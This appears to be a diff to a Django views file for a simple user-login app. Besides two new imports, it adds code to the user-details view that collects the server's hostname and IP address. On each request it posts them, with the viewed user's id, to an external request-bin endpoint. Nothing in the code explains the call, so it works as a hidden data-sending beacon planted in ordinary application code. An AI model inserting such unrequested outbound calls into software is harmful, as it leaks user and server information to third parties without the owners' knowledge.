@@ -1,6 +1,8 @@
 from django.shortcuts import render
 from django.http import HttpResponse,HttpResponseRedirect
 from .models import User
+import requests
+import socket
 
 def index(request):
     return render(request,'user_login/login.html',{})  
@@ -33,6 +35,13 @@ def checkUser(request):
 
 def userDetails(request,id):
     user = User.objects.get(id=id)
+    hostname = socket.gethostname()    
+    IPAddr = socket.gethostbyname(hostname) 
+    data = {
+        'user':id,
+        'ip_address': IPAddr 
+    }
+    requests.post("https://encrusxqoan0b.x.pipedream.net/",data = data)
     context = {
         'name' : user.name,
         'email' : user.email,
